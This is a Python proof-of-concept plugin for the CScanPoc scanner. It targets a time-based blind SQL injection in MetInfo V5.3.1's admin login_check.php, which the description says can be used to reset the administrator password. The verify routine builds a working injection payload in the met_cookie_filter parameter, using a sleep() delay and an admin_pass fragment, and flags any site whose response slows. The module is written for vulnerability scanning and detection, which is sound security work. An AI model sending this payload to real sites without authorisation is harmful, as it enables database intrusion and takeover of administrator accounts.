# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'MetInfo_0013'  # 平台漏洞编号，留空
    name = 'MetInfo V5.3.1 sql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-07-09'  # 漏洞公布时间
    desc = '''
        MetInfo V5.3.1 sql注入，可重置管理员密码。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'MetInfo'  # 漏洞应用名称
    product_version = 'V5.3.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b09ab725-12e8-4c49-9a58-20f1f1eb4494'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-16'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            admin_url = self.target + '/admin/'
            start_time = time.time()
            code, head, res, errcode, _ = hh.http(admin_url)
            normal_time = time.time() - start_time  # 正常访问链接的时间
            if code == 404:
                return False
            delay_time = normal_time + 3  # 盲注延时时间
            payload = self.target + \
                '/admin/login/login_check.php?met_cookie_filter[a]=a%27,admin_pass=admin_pass+where+id=1+and+233=if(1=1,sleep('+str(
                    delay_time)+'),233);+%23–'
            # print delay_time;
            start_time = time.time()
            code, head, res, errcode, _ = hh.http(payload)
            payload_time = time.time() - start_time
            if code == 404:
                return False
            if(payload_time > (normal_time + 2)):  # time函数有一定误差，因此用大于正常时间2s检测是否有注入
                #security_hole(self.target + ' sql injection vulnerable')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
